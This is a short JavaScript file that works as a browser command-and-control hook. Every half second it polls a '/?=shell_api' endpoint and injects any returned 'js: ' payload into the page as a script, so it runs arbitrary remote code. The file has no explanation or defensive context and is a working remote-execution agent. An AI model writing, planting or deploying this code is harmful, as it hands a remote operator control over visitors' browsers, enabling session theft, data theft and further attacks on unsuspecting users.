


console.log("Load OK!")

var loop;

function exec(command) {
    if (command === 'none') {
        return false
    }
    if (command.startsWith("js: ")) {
        var javaScript = command.substring("js: ".length,command.length);

        var script = document.createElement("script");
        script.innerHTML = javaScript;
        document.body.appendChild(script);
        return true;
    }
    else {
        
    }
}

loop = setInterval(function () {
    try{
        var xhr = new XMLHttpRequest();
        xhr.open("GET","/?=shell_api",true)
        xhr.send();

        xhr.onload = function (e) {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    exec(xhr.responseText);
                }
                else{
                    clearInterval(loop);
                }
            }
        };
    }catch (e){
        clearInterval(loop);
    }
} , 500)